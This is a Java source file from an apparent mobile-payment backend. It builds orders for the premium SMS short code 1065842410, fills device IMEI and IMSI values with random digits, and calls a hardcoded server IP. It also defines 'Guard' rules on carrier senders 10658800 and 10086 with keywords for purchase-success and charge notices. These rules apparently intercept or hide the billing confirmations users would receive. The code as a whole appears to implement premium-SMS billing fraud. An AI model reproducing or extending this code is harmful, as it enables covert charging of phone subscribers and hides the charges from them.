package com.jxt.pay.appclient.service.dynamic.net;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;

import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.CommonUtil;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.GetData;
import com.jxt.pay.appclient.utils.StringUtils;

import sun.misc.BASE64Decoder;

/**
 * 深圳拓思创新
 * @author leoliu
 *
 */
public class SztsDynamicService implements IDynamicService{

	private static final String TYPE = "szts";
	
	private static final String REQUESTPARAM = "cmd={cmd}?cmd=1&price={price}&imei={imei}&imsi={imsi}&phone=13800138000&cpparam={cpparam}";
	
	private int timeOut = 60;
	
	private static final String DEST = "1065842410";
	private static final Integer DEFAULTSUCCESSTIMEOUT = 2;
	
	private static final Guard guard1 = new Guard("10658800","成功购买",2880,"1",0);
	private static final Guard guard2 = new Guard("10086","点数|帐户|充值|花费",2880,null,1);
	private static final Guard guard3 = new Guard("10658800","",960,null,1);
	private static final Guard guard4 = new Guard("10086","",960,null,1);
	
	@Override
	public String getType() {
		return TYPE;
	}

	private Map<String, Long> tryMap = new HashMap<String, Long>();
	
	@Override
	public String dynamic(Map<String, String> map) {
		
		String xml = null;
		
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String channel = map.get("channel");
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(channel);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(channel,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(channel);
					return DynamicUtils.parseError("599");
				}
			}
			
			String imsi = StringUtils.defaultString(map.get("imsi"));
			
			if(imsi.length() == 0){
				imsi = "46000115310";
			}
			
			imsi = fillImei(imsi);
			
			String param = REQUESTPARAM.replace("{imsi}" , imsi);
			
			String imei = StringUtils.defaultString(map.get("imei"));
			
			imei = fillImei(imei.replaceAll("[a-zA-Z]","1"));
			
			param = param.replace("{imei}", imei);
			
			param = param.replace("{cmd}", StringUtils.defaultString(map.get("cmd")));
			param = param.replace("{price}", StringUtils.defaultString(map.get("price")));
			param = param.replace("{cpparam}", StringUtils.defaultString(channel.substring(channel.length() - 6)));
			
			System.out.println("szts : "+url+";"+param);
			String responseTxt = GetData.getData(url,param);
			System.out.println("szts response xml : "+responseTxt);
			
			if(responseTxt != null && responseTxt.length() > 0){
				
				tryMap.remove(channel);
				
				try{
					xml = parseXml(map,responseTxt);
				}catch(Exception e){
					return DynamicUtils.parseError("597");
				}
			}else{
				System.out.println("szts responseXml is null");
				return DynamicUtils.parseWait(10,map);
			}
		}
		
		return xml;
	}
	
	private String fillImei(String imei){
		if(imei.length() < 15){
			int len = imei.length();
			
			for(int i = 0 ; i < 15 - len ; i ++){
				imei += new Random().nextInt(10);
			}
		}
		
		return imei;
	}

	private String parseXml(Map<String, String> map,String data){
		
		if(data != null && data.length() > 0){
			try {
				String msg = CommonUtil.base64Decode(data.replaceAll(" ","+"));
				
				if(msg != null && (msg.startsWith("ZP") || msg.startsWith("a4"))){

					List<Sms> smsList = new ArrayList<Sms>();
					
					Sms sms = new Sms();
					
					sms.setSmsContent(msg);
				
					sms.setSmsDest(DEST);
					sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
					
					if(msg.startsWith("a4")){
						sms.setSendType(Sms.SENDTYPE_DATA);
					}
					
					smsList.add(sms);
					
					Sms guardSms = new Sms();
					
					List<Guard> guardList = new ArrayList<Guard>();
					
					guardList.add(guard1);
					guardList.add(guard2);
					
					guardList.add(guard3);
					guardList.add(guard4);
					
					guardSms.setGuardList(guardList);
					
					smsList.add(0, guardSms);
						
					return XstreamHelper.toXml(smsList);
				}
				
			} catch (UnsupportedEncodingException e) {
				e.printStackTrace();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
		return null;
	}
	
	public static void main(String[] args){
		
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("url","http://183.62.161.183:3476/i2/RLW2/RecOrderNoIMSI_Base64");
		map.put("cmd","FLEGA042H");
		map.put("price","1");
		map.put("imei","860174010602000");
		map.put("imsi","460030912121002");
		map.put("channel","10B601a087654323");
		
		String xml = new SztsDynamicService().dynamic(map);
		
		System.out.println(xml);
		
//		try {
//			System.out.println(new String(decoder.decodeBuffer("ZXJyb3I=".replaceAll(" ","+")),"utf-8"));
//		} catch (UnsupportedEncodingException e) {
//			// TODO Auto-generated catch block
//			e.printStackTrace();
//		} catch (IOException e) {
//			// TODO Auto-generated catch block
//			e.printStackTrace();
//		}
	}
}
